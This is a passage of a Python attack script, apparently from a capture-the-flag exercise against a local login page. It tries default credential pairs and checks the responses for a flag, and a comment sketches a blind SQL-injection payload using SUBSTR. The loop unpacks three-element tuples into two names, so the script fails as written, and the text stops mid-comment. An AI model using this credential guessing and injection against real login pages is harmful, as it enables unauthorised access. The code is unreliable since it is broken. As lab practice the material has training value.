import requests
import re

target = "http://127.0.0.1:32895/index.php"

print("[*] Testing if correct credentials reveal different content\n")

# Maybe we need to extract the actual password via blind SQLi and then login
# Let's assume blind SQLi IS working but we're not detecting it correctly

# The context says to use SUBSTR to extract character by character
# Maybe the detection should be based on whether we can LOGIN, not on response differences

# Theory: admin' AND SUBSTR(password,1,1)='a' AND '1'='1
# If password starts with 'a', this creates a valid login condition

print("[1] Testing theory: Maybe we need to match both username AND password condition\n")

# Try to see if there's a difference when we get closer to valid credentials
test_payloads = [
    ("admin", "admin", "Common combo"),
    ("admin", "password", "Common combo 2"),
    ("admin", "admin123", "Common combo 3"),
    ("root", "root", "Root combo"),
    ("administrator", "administrator", "Admin combo"),
]

for user, pw in test_payloads:
    r = requests.get(target, params={'username': user, 'password': pw})
    print(f"  {user}/{pw}: Length={len(r.text)}", end="")
    
    if 'FLAG{' in r.text:
        flags = re.findall(r'FLAG\{[^}]+\}', r.text)
        print(f" [!!!] FLAG: {flags[0]}")
        print(f"\nFull response:\n{r.text}\n")
    elif 'not the admin' not in r.text:
        print(f" [DIFFERENT RESPONSE!]")
        print(f"  Response:\n{r.text}\n")
    else:
        print()

print("\n[2] Testing if successful admin login has different response\n")

# Maybe the challenge is that we need to:
